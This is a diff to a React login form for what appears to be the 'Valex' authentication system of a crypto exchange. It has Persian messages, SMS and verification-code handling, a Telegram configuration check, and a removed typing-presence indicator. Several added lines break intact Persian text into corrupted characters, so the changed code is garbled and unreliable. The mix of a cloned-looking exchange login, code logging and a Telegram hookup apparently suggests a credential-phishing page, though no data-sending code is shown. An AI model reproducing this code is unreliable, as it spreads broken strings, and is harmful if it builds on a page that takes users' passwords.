@@ -303,7 +303,7 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("���� Verifying code:", verifyCode, "SMS mode:", isSmsMode);
+      console.log("🔍 Verifying code:", verifyCode, "SMS mode:", isSmsMode);
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
@@ -426,7 +426,7 @@ export const LoginForm = () => {
       }, 500);
     } catch (error) {
       console.error("Password submission error:", error);
-      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
+      setErrors({ password: "خطا در ارسال رمز عبور. لطف�� دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -871,27 +871,6 @@ export const LoginForm = () => {
           }}
         />
 
-        {/* Presence Status Indicator */}
-        {presence.isTracking && (
-          <div style={{
-            display: "flex",
-            justifyContent: "center",
-            marginBottom: "16px",
-            direction: "rtl"
-          }}>
-            <PresenceIndicator
-              formName="LoginForm"
-              showText={true}
-              showEmoji={true}
-              showTyping={true}
-              size="md"
-              position="inline"
-              theme="auto"
-              className="login-presence-indicator"
-            />
-          </div>
-        )}
-
         {/* Content based on current step */}
         <div
           style={{
@@ -907,7 +886,7 @@ export const LoginForm = () => {
               {/* Alert Messages */}
               <div>
                 <AlertMessage>
-                    سیستم احراز هویت والکس آماده است.
+                    سیستم احراز هویت والکس آماده ا��ت.
                 </AlertMessage>
 
                 <div style={{ marginTop: "8px" }}>
